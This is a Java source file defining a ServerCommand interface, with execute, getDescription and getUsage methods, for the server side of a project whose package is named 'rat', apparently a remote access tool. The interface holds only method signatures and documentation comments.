package com.stoppedwumm.rat.commands; // Or your chosen package

import com.stoppedwumm.rat.App;
import com.stoppedwumm.rat.ServerShit.Handler;

public interface ServerCommand {
    /**
     * Executes the command.
     *
     * @param clientHandler The handler for the client who issued the command.
     * @param serverInstance The main server instance, for accessing server-wide resources.
     * @param args The arguments passed with the command (command name itself is excluded).
     */
    void execute(Handler clientHandler, App serverInstance, String[] args);

    /**
     * @return A brief description of the command for help purposes.
     */
    String getDescription();

    /**
     * @return The expected usage string for the command (e.g., "RELAY <targetClientId> <message>").
     */
    String getUsage();
}